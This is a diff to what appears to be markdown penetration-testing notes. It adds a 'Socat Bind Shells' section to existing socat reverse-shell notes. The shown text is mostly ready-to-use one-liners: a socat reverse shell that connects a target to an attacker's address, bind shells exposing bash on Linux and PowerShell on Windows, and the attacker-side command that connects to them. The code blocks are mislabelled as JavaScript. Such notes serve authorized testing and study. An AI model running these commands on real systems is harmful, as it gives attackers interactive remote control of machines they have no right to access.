@@ -60,7 +60,22 @@ This is the equivalent command for a Linux Target
 socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
   
-
   
+## Socat Bind Shells
+
+On a Linux target
+```JavaScript
+socat TCP-L:<PORT> EXEC:"bash -li"
+```
+  
+On a Windows target
+```JavaScript
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+```
+  
+And from our attacking machine to connect to your listener...
+```JavaScript
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+```
 
 
